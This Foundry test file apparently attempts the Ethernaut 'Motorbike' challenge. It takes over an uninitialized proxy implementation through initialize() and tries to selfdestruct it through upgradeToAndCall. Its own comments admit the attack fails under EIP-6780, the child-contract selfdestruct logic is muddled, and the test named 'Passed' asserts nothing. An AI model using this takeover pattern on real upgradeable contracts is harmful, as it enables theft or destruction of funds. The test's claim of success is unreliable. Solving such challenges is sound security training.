// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

interface IMotorBike {
    function upgrader() external view returns(address);
}
interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns(address);
}

contract MotorbikeTest is Test {
    IMotorBike motorbike;
    IEngine engine;
    EngineAttack maliciousImplementation;

    address attacker = makeAddr("attacker");
    address owner = makeAddr("owner");

    function setUp() public {
        // vm.createSelectFork("sepolia");
        // motorbike = IMotorBike(address(0x30649a58B74d44A3EDD7c21e29749Cf76542d078));
        // engine = IEngine(address(0x97EBd8a149Fd4a47028f98992f8b760eeE5890c6));
        maliciousImplementation = new EngineAttack();

        engine = IEngine(deployCode("MotorBike.sol:Engine"));
        motorbike = IMotorBike(deployCode("MotorBike.sol:Motorbike", abi.encode(engine)));
    }
    function test_Challenge25_Passed() public {
        address upgrader = IEngine(address(motorbike)).upgrader();

        vm.startPrank(attacker);
        // attacker will now become the upgrader in the implementation storage
        engine.initialize();
        bytes memory callData = abi.encodeWithSignature("attack()");
        // due to delegate call in upgradeToAndCall function (the old implementation), selfdestruct will run in the old implementation storage
        // destroying the old implementation
        engine.upgradeToAndCall(address(maliciousImplementation), callData);
        vm.stopPrank();
        
        vm.prank(upgrader);
        // owner tries to upgrade and won't find it 
        // but

        // vm.expectRevert(); // this won't revert
        // Because selfdestruct in Foundry (with EIP-6780 active) 
        // no longer deletes the contract code when called outside the deployment transaction. 
        // The Engine's code is still there.
        IEngine(address(motorbike)).upgradeToAndCall(address(engine), "");
    }
} 

contract EngineAttack {

    // due to delegate call in Engine contract (the old implementation) selfdestruct will run in the old implementation storage
    function attack() public {
        EngineAttack2 attack = new EngineAttack2();
    }
}


contract EngineAttack2 {
    // we try to call in a deployment transaction, but it didn't work either    
    constructor() {
        selfdestruct(payable(address(msg.sender)));
    }
}